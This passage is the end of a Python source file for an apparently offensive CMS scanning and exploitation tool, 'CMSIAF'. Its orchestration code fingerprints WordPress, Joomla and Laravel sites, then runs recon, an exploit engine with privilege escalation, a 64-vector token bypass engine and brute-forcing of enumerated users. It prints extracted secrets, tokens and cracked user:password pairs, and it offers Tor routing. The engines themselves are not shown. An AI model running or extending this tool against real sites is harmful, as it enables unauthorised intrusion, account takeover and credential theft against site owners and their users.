        update_log('cms_version', version); update_log('detection_confidence', det_results['confidence'])
        update_log('detection_method', ','.join(det_results['methods']))
        if det_results['waf']: update_log('waf', det_results['waf'])
        if det_results['cdn']: update_log('cdn', det_results['cdn'])
        if det_results['plugins']: update_log('plugins_enum', ','.join(det_results['plugins']))
        if det_results['themes']: update_log('themes_enum', ','.join(det_results['themes']))
        
        init_src = getsource(url, ua)
        src = init_src[1] if init_src[0] == '1' else ""
        hdrs = init_src[2] if init_src[0] == '1' else ""
        if version == None or version == "unknown":
            version = detect_version(cid, url, ua, src, hdrs)
            inf(f"Version from deep scan: {version}")
            update_log('cms_version', version)
        
        deep_results = {}; recon_results = {}; token_results = {}
        
        if cid == 'wp' and CMS_DB.get(cid, {}).get('deeps', '0') == '1':
            wp = WPDeepScan()
            deep_results = wp.run(url, ua, src)
            if deep_results.get('users'): update_log('wp_users', ','.join(deep_results['users']))
            if deep_results.get('plugins'): update_log('wp_plugins', ','.join(deep_results['plugins']))
            if deep_results.get('themes'): update_log('wp_themes', ','.join(deep_results['themes']))
            if deep_results.get('registration')[0]: update_log('user_registration', deep_results['registration'][1])
            if deep_results.get('path'): update_log('path', deep_results['path'])
            if deep_results.get('xmlrpc'): update_log('xmlrpc', 'enabled')
        elif cid == 'joom' and CMS_DB.get(cid, {}).get('deeps', '0') == '1':
            joom = JoomlaDeepScan()
            deep_results = joom.run(url, ua, src)
        elif cid == 'laravel' and CMS_DB.get(cid, {}).get('deeps', '0') == '1':
            laravel = LaravelDeepScan()
            deep_results = laravel.run(url, ua, src)
            update_log('laravel_version', deep_results.get('version', 'unknown'))
            update_log('laravel_environment', deep_results.get('env', 'unknown'))
            update_log('laravel_debug', str(deep_results.get('debug_mode', False)))
        
        if CFG['enable_advanced']:
            inf(f"\n{Colors.BOLD}{Colors.CYAN}{'═'*58}{Colors.RESET}")
            inf(f"{Colors.BOLD}{Colors.CYAN}  PHASE 1-10: ADVANCED INTELLIGENCE SCANNING{Colors.RESET}")
            inf(f"{Colors.BOLD}{Colors.CYAN}{'═'*58}{Colors.RESET}")
            ai_engine = AdvancedIntelligenceEngine(url, ua, cid, cname)
            ai_results = ai_engine.run_all_phases()
            print(f"\n{Colors.BOLD}{Colors.CYAN}╔{'═'*58}╗{Colors.RESET}")
            print(f"{Colors.BOLD}{Colors.CYAN}║     ADVANCED INTELLIGENCE SCAN RESULTS                    ║{Colors.RESET}")
            print(f"{Colors.BOLD}{Colors.CYAN}╠{'═'*58}╣{Colors.RESET}")
            for phase_name, phase_data in ai_results.items():
                if phase_data:
                    phase_display = phase_name.replace('phase', 'Phase ').replace('_', ' ')
                    print(f"║ {Colors.CYAN}{phase_display}:{Colors.RESET}")
                    for key, value in list(phase_data.items())[:3]:
                        if isinstance(value, list) and len(value) > 3:
                            print(f"║   {Colors.GREEN}{key}: {', '.join(str(v)[:20] for v in value[:3])}... ({len(value)} total){Colors.RESET}")
                        elif isinstance(value, dict):
                            print(f"║   {Colors.GREEN}{key}: {json.dumps(value)[:50]}...{Colors.RESET}")
                        else:
                            print(f"║   {Colors.GREEN}{key}: {str(value)[:50]}{Colors.RESET}")
                    print(f"{Colors.BOLD}{Colors.CYAN}║{'─'*58}║{Colors.RESET}")
            print(f"{Colors.BOLD}{Colors.CYAN}╚{'═'*58}╝{Colors.RESET}")
        
        if CFG['enable_recon']:
            inf(f"\n{Colors.BOLD}{Colors.MAGENTA}{'═'*58}{Colors.RESET}")
            inf(f"{Colors.BOLD}{Colors.MAGENTA}  PHASE 1-14: ADVANCED RECONNAISSANCE SCANNING{Colors.RESET}")
            inf(f"{Colors.BOLD}{Colors.MAGENTA}{'═'*58}{Colors.RESET}")
            recon_engine = ReconnaissanceEngine(url, ua, COMPONENTS.session_manager.get_session())
            recon_results = recon_engine.run_all_phases()
            print(f"\n{Colors.BOLD}{Colors.MAGENTA}╔{'═'*58}╗{Colors.RESET}")
            print(f"{Colors.BOLD}{Colors.MAGENTA}║     RECONNAISSANCE SCAN RESULTS                          ║{Colors.RESET}")
            print(f"{Colors.BOLD}{Colors.MAGENTA}╠{'═'*58}╣{Colors.RESET}")
            if recon_results.get('subdomains'):
                print(f"║ {Colors.CYAN}Subdomains:{Colors.RESET} {Colors.GREEN}{len(recon_results['subdomains'])} found{Colors.RESET}")
                for sub in recon_results['subdomains'][:5]:
                    print(f"║   - {sub}{Colors.RESET}")
            if recon_results.get('subdomain_takeover'):
                print(f"║ {Colors.RED}Subdomain Takeover:{Colors.RESET} {Colors.RED}{len(recon_results['subdomain_takeover'])} possible!{Colors.RESET}")
                for item in recon_results['subdomain_takeover'][:3]:
                    print(f"║   - {item['subdomain']} -> {item['service']}{Colors.RESET}")
            if recon_results.get('technologies'):
                print(f"║ {Colors.CYAN}Technologies:{Colors.RESET} {Colors.GREEN}{len(recon_results['technologies'])} detected{Colors.RESET}")
                for tech in recon_results['technologies'][:5]:
                    print(f"║   - {tech}{Colors.RESET}")
            if recon_results.get('api_endpoints'):
                print(f"║ {Colors.CYAN}API Endpoints:{Colors.RESET} {Colors.GREEN}{len(recon_results['api_endpoints'])} found{Colors.RESET}")
                for api in recon_results['api_endpoints'][:5]:
                    print(f"║   - {api}{Colors.RESET}")
            if recon_results.get('graphql_schema'):
                print(f"║ {Colors.CYAN}GraphQL Schema:{Colors.RESET} {Colors.GREEN}Extracted ({recon_results['graphql_schema'].get('types_count', 0)} types){Colors.RESET}")
            if recon_results.get('websocket_endpoints'):
                print(f"║ {Colors.CYAN}WebSocket:{Colors.RESET} {Colors.GREEN}{len(recon_results['websocket_endpoints'])} found{Colors.RESET}")
                for ws in recon_results['websocket_endpoints'][:3]:
                    print(f"║   - {ws}{Colors.RESET}")
            if recon_results.get('secrets'):
                print(f"║ {Colors.RED}Secrets Found:{Colors.RESET} {Colors.RED}{len(recon_results['secrets'])}{Colors.RESET}")
                for sec in recon_results['secrets'][:3]:
                    print(f"║   - {sec['type']}: {sec['value']}{Colors.RESET}")
            if recon_results.get('jwt_tokens'):
                print(f"║ {Colors.YELLOW}JWT Tokens:{Colors.RESET} {Colors.YELLOW}{len(recon_results['jwt_tokens'])}{Colors.RESET}")
                for jwt_data in recon_results['jwt_tokens'][:3]:
                    print(f"║   - {jwt_data.get('token', '')[:30]}...{Colors.RESET}")
            if recon_results.get('open_ports'):
                print(f"║ {Colors.CYAN}Open Ports:{Colors.RESET} {Colors.GREEN}{len(recon_results['open_ports'])} found{Colors.RESET}")
                print(f"║   - {', '.join(map(str, recon_results['open_ports'][:10]))}{Colors.RESET}")
            if recon_results.get('cors_config', {}).get('wildcard'):
                print(f"║ {Colors.RED}CORS Wildcard:{Colors.RESET} {Colors.RED}DETECTED!{Colors.RESET}")
            if recon_results.get('ssl_info'):
                print(f"║ {Colors.CYAN}SSL:{Colors.RESET} {Colors.GREEN}{recon_results['ssl_info'].get('version', 'N/A')}{Colors.RESET}")
            if recon_results.get('cache_headers', {}).get('analysis'):
                cache = recon_results['cache_headers']['analysis']
                print(f"║ {Colors.CYAN}Cache:{Colors.RESET} {Colors.GREEN}Max-Age: {cache.get('max_age', 'N/A')}s{Colors.RESET}")
            if recon_results.get('third_party'):
                print(f"║ {Colors.CYAN}Third-Party:{Colors.RESET} {Colors.GREEN}{len(recon_results['third_party'])} detected{Colors.RESET}")
            print(f"{Colors.BOLD}{Colors.MAGENTA}╚{'═'*58}╝{Colors.RESET}")
            
            if recon_results.get('subdomains'): update_log('subdomains', ','.join(recon_results['subdomains'][:20]))
            if recon_results.get('api_endpoints'): update_log('api_endpoints', ','.join(recon_results['api_endpoints'][:20]))
            if recon_results.get('secrets'): update_log('secrets_found', str(len(recon_results['secrets'])))
            if recon_results.get('jwt_tokens'): update_log('jwt_tokens', str(len(recon_results['jwt_tokens'])))
            if recon_results.get('graphql_schema'): update_log('graphql_schema', 'extracted')
        
        if CFG['enable_offensive']:
            inf(f"\n{Colors.BOLD}{Colors.RED}{'═'*58}{Colors.RESET}")
            inf(f"{Colors.BOLD}{Colors.RED}  PHASE 1-10: HYPER OFFENSIVE SECURITY ASSESSMENTS{Colors.RESET}")
            inf(f"{Colors.BOLD}{Colors.RED}{'═'*58}{Colors.RESET}")
            off_engine = HyperOffensiveEngine(url, ua, cid, cname, version)
            off_results = off_engine.run_all_phases()
            print(f"\n{Colors.BOLD}{Colors.RED}╔{'═'*58}╗{Colors.RESET}")
            print(f"{Colors.BOLD}{Colors.RED}║     HYPER OFFENSIVE SECURITY RESULTS                       ║{Colors.RESET}")
            print(f"{Colors.BOLD}{Colors.RED}╠{'═'*58}╣{Colors.RESET}")
            print(f"║ {Colors.CYAN}Successful Exploits: {Colors.GREEN}{len(off_results['successful'])}{Colors.RESET}")
            print(f"║ {Colors.CYAN}Failed Exploits: {Colors.YELLOW}{len(off_results['failed'])}{Colors.RESET}")
            print(f"║ {Colors.CYAN}Skipped Checks: {Colors.CYAN}{len(off_results['skipped'])}{Colors.RESET}")
            if off_results['successful']:
                print(f"{Colors.BOLD}{Colors.RED}║{'─'*58}║{Colors.RESET}")
                print(f"{Colors.BOLD}{Colors.RED}║ SUCCESSFUL EXPLOITS:{Colors.RESET}")
                for i, exp in enumerate(off_results['successful'][:10]):
                    severity_color = Colors.RED if exp.get('severity') == 'critical' else Colors.YELLOW if exp.get('severity') == 'high' else Colors.WHITE
                    print(f"║ {severity_color}{i+1}. {exp.get('name', 'Unknown')}{Colors.RESET}")
                    if exp.get('proof'):
                        print(f"║    Proof: {exp.get('proof', '')[:60]}...{Colors.RESET}")
                if len(off_results['successful']) > 10:
                    print(f"║ {Colors.YELLOW}... and {len(off_results['successful'])-10} more{Colors.RESET}")
            print(f"{Colors.BOLD}{Colors.RED}╚{'═'*58}╝{Colors.RESET}")
        
        if CFG['enable_token_bypass']:
            inf(f"\n{Colors.BOLD}{Colors.YELLOW}{'═'*58}{Colors.RESET}")
            inf(f"{Colors.BOLD}{Colors.YELLOW}  TOKEN BYPASS ENGINE - 64 Attack Vectors{Colors.RESET}")
            inf(f"{Colors.BOLD}{Colors.YELLOW}{'═'*58}{Colors.RESET}")
            token_engine = TokenBypassEngine(url, ua, COMPONENTS.session_manager.get_session(), cid, cname)
            token_results = token_engine.run_all_bypasses()
            print(f"\n{Colors.BOLD}{Colors.YELLOW}╔{'═'*58}╗{Colors.RESET}")
            print(f"{Colors.BOLD}{Colors.YELLOW}║     TOKEN BYPASS RESULTS                                    ║{Colors.RESET}")
            print(f"{Colors.BOLD}{Colors.YELLOW}╠{'═'*58}╣{Colors.RESET}")
            print(f"║ {Colors.CYAN}Successful Bypasses:{Colors.RESET} {Colors.RED}{len(token_results['bypasses'])}{Colors.RESET}")
            print(f"║ {Colors.CYAN}Tokens Extracted:{Colors.RESET} {Colors.YELLOW}{len(token_results['tokens_extracted'])}{Colors.RESET}")
            if token_results['bypasses']:
                print(f"{Colors.BOLD}{Colors.YELLOW}║{'─'*58}║{Colors.RESET}")
                print(f"{Colors.BOLD}{Colors.YELLOW}║ SUCCESSFUL BYPASSES:{Colors.RESET}")
                for i, bypass in enumerate(token_results['bypasses'][:10]):
                    severity_color = Colors.RED if bypass.get('severity') == 'critical' else Colors.YELLOW if bypass.get('severity') == 'high' else Colors.WHITE
                    print(f"║ {severity_color}{i+1}. {bypass.get('name', 'Unknown')}{Colors.RESET}")
                    if bypass.get('proof'):
                        print(f"║    Proof: {bypass.get('proof', '')[:60]}...{Colors.RESET}")
                if len(token_results['bypasses']) > 10:
                    print(f"║ {Colors.YELLOW}... and {len(token_results['bypasses'])-10} more{Colors.RESET}")
            if token_results['tokens_extracted']:
                print(f"{Colors.BOLD}{Colors.YELLOW}║{'─'*58}║{Colors.RESET}")
                print(f"{Colors.BOLD}{Colors.YELLOW}║ EXTRACTED TOKENS:{Colors.RESET}")
                for i, token in enumerate(token_results['tokens_extracted'][:5]):
                    print(f"║ {Colors.GREEN}{i+1}. {token.get('value', '')[:30]}...{Colors.RESET}")
            print(f"{Colors.BOLD}{Colors.YELLOW}╚{'═'*58}╝{Colors.RESET}")
        
        inf("Running security checks...")
        checker = SecurityChecker(url, cid, cname, version)
        security_results = checker.check_all()
        vulns = security_results['vulnerabilities']
        summary = security_results['summary']
        inf(f"Found {summary['total']} vulnerabilities")
        inf(f"Risk level: {summary['risk']}")
        
        inf("Running exploit tests with privilege escalation...")
        exploiter = ExploitEngine(url, cid, cname, version)
        exploit_results = exploiter.run_all()
        if exploit_results['successful']:
            suc(f"Successful exploits: {len(exploit_results['successful'])}")
            for exp in exploit_results['successful']:
                print(f"  - {exp.get('name')}: {exp.get('proof')}")
        if exploiter.found_users:
            for user in exploiter.found_users:
                if user not in deep_results.get('users', []):
                    deep_results['users'] = deep_results.get('users', []) + [user]
        
        if deep_results.get('users'):
            bruter = BruteForceEngine(url, cid)
            brute_results = bruter.run(deep_results['users'])
            if brute_results:
                suc(f"Brute force successful for {len(brute_results)} users")
                for user, pwd in list(brute_results.items()):
                    print(f"  - {user}:{pwd}")
        
        RAW_DATA = {
            'user_raw_data': deep_results.get('user_raw_data', {}),
            'plugin_raw_data': deep_results.get('plugin_raw_data', {}),
            'theme_raw_data': deep_results.get('theme_raw_data', {}),
            'vulnerabilities': vulns,
            'exploits': exploit_results,
            'intelligence': ai_results if CFG['enable_advanced'] else {},
            'offensive': off_results if CFG['enable_offensive'] else {},
            'recon_data': recon_results if CFG['enable_recon'] else {},
            'token_bypasses': token_results if CFG['enable_token_bypass'] else {},
            'total_requests': TOTAL_REQUESTS,
            'scan_duration': round(time.time() - CSTART, 2)
        }
        save_report(url, cname, version, vulns, exploit_results, det_results, deep_results, RAW_DATA, token_results)
        if CFG['show_raw']:
            display_raw_data(RAW_DATA)
        
        print(f"\n{Colors.GREEN}╔{'═'*58}╗{Colors.RESET}")
        print(f"{Colors.GREEN}║                 SCAN COMPLETE                              ║{Colors.RESET}")
        print(f"{Colors.GREEN}╠{'═'*58}╣{Colors.RESET}")
        print(f"║ {Colors.CYAN}Target:{Colors.RESET} {Colors.GREEN}{url}{Colors.RESET}")
        print(f"║ {Colors.CYAN}CMS:{Colors.RESET} {Colors.GREEN}{cname} {version}{Colors.RESET}")
        print(f"║ {Colors.CYAN}Vulnerabilities:{Colors.RESET} {Colors.GREEN}{summary['total']}{Colors.RESET}")
        print(f"║ {Colors.CYAN}Risk Level:{Colors.RESET} {Colors.GREEN}{summary['risk']}{Colors.RESET}")
        print(f"║ {Colors.CYAN}Successful Exploits:{Colors.RESET} {Colors.GREEN}{len(exploit_results['successful'])}{Colors.RESET}")
        print(f"║ {Colors.CYAN}Users Found:{Colors.RESET} {Colors.GREEN}{len(deep_results.get('users', []))}{Colors.RESET}")
        print(f"║ {Colors.CYAN}Plugins Found:{Colors.RESET} {Colors.GREEN}{len(deep_results.get('plugins', []))}{Colors.RESET}")
        print(f"║ {Colors.CYAN}Themes Found:{Colors.RESET} {Colors.GREEN}{len(deep_results.get('themes', []))}{Colors.RESET}")
        if CFG['enable_recon']:
            print(f"║ {Colors.CYAN}Subdomains:{Colors.RESET} {Colors.GREEN}{len(recon_results.get('subdomains', []))}{Colors.RESET}")
            print(f"║ {Colors.CYAN}API Endpoints:{Colors.RESET} {Colors.GREEN}{len(recon_results.get('api_endpoints', []))}{Colors.RESET}")
            print(f"║ {Colors.CYAN}Secrets Found:{Colors.RESET} {Colors.GREEN}{len(recon_results.get('secrets', []))}{Colors.RESET}")
            print(f"║ {Colors.CYAN}JWT Tokens:{Colors.RESET} {Colors.GREEN}{len(recon_results.get('jwt_tokens', []))}{Colors.RESET}")
        if CFG['enable_token_bypass']:
            print(f"║ {Colors.CYAN}Token Bypasses:{Colors.RESET} {Colors.GREEN}{len(token_results.get('bypasses', []))}{Colors.RESET}")
            print(f"║ {Colors.CYAN}Tokens Extracted:{Colors.RESET} {Colors.GREEN}{len(token_results.get('tokens_extracted', []))}{Colors.RESET}")
        print(f"║ {Colors.CYAN}Favicon Hash:{Colors.RESET} {Colors.GREEN}{det_results.get('favicon_hash', 'Not found')}{Colors.RESET}")
        print(f"║ {Colors.CYAN}Favicon URL:{Colors.RESET} {Colors.GREEN}{det_results.get('favicon_url', 'Not found')}{Colors.RESET}")
        print(f"║ {Colors.CYAN}Total Requests:{Colors.RESET} {Colors.GREEN}{TOTAL_REQUESTS}{Colors.RESET}")
        print(f"║ {Colors.CYAN}Duration:{Colors.RESET} {Colors.GREEN}{round(time.time() - CSTART, 2)}s{Colors.RESET}")
        print(f"║ {Colors.CYAN}Report:{Colors.RESET} {Colors.GREEN}scan_report_*.json{Colors.RESET}")
        print(f"{Colors.GREEN}╚{'═'*58}╝{Colors.RESET}")
        if summary['risk'] in ['CRITICAL', 'HIGH']:
            wrn(f"High risk detected! Please review findings.")
        else:
            inf("Scan completed successfully.")
    else:
        err("CMS detection failed")
    
    lock_and_redirect()

def main():
    parser = argparse.ArgumentParser(description="CMSIAF - Content Management Security Intelligence Framework")
    parser.add_argument('-u', '--url', help='Target URL to scan', required=False)
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    parser.add_argument('-i', '--ignore', help='Comma separated CMS IDs to ignore')
    parser.add_argument('-s', '--strict', help='Comma separated CMS IDs to strictly check')
    parser.add_argument('--light', action='store_true', help='Light scan mode')
    parser.add_argument('--only-cms', action='store_true', help='Only detect CMS')
    parser.add_argument('--skip-scanned', action='store_true', help='Skip already scanned targets')
    parser.add_argument('--follow-redirect', action='store_true', help='Follow redirects')
    parser.add_argument('--no-redirect', action='store_true', help="Don't follow redirects")
    parser.add_argument('--batch', action='store_true', help='Batch mode')
    parser.add_argument('--no-raw', action='store_true', help='Hide raw data output')
    parser.add_argument('--deep-level', type=int, choices=[1,2,3,4,5], default=5, help='Deep scan level (1-5)')
    parser.add_argument('--no-advanced', action='store_true', help='Disable advanced intelligence scanning')
    parser.add_argument('--no-offensive', action='store_true', help='Disable offensive security assessments')
    parser.add_argument('--no-recon', action='store_true', help='Disable reconnaissance scanning')
    parser.add_argument('--no-token-bypass', action='store_true', help='Disable token bypass engine')
    parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    parser.add_argument('--tor', action='store_true', help='Use Tor proxy (localhost:9050)')
    parser.add_argument('--no-cache', action='store_true', help='Disable caching')
    parser.add_argument('--verify-ssl', action='store_true', help='Verify SSL certificates')
    parser.add_argument('--rate-limit', type=int, default=10, help='Max requests per second')
    parser.add_argument('--debug', action='store_true', help='Enable debug mode')
    parser.add_argument('--no-db', action='store_true', help='Disable database storage')
    args = parser.parse_args()
    
    CFG['verbose'] = args.verbose
    CFG['show_raw'] = not args.no_raw
    CFG['enable_advanced'] = not args.no_advanced
    CFG['enable_offensive'] = not args.no_offensive
    CFG['enable_recon'] = not args.no_recon
    CFG['enable_token_bypass'] = not args.no_token_bypass
    CFG['deep_scan_level'] = args.deep_level if args.deep_level else 5
    CFG['batch'] = args.batch
    CFG['light'] = args.light
    CFG['only'] = args.only_cms
    CFG['skip'] = args.skip_scanned
    CFG['follow'] = args.follow_redirect
    CFG['no_redirect'] = args.no_redirect
    CFG['debug'] = args.debug
    CFG['db_enabled'] = not args.no_db
    if args.ignore: CFG['ignore'] = args.ignore.split(',')
    if args.strict: CFG['strict'] = args.strict.split(',')
    if args.proxy: CFG['proxy'] = args.proxy
    if args.tor: CFG['tor'] = True
    if args.no_cache: CFG['cache_enabled'] = False
    if args.verify_ssl: CFG['verify_ssl'] = True
    if args.rate_limit: CFG['rate_limit'] = args.rate_limit
    if not args.url: args.url = targetinp()
    scan_target(args.url)

if __name__ == "__main__":
    main()
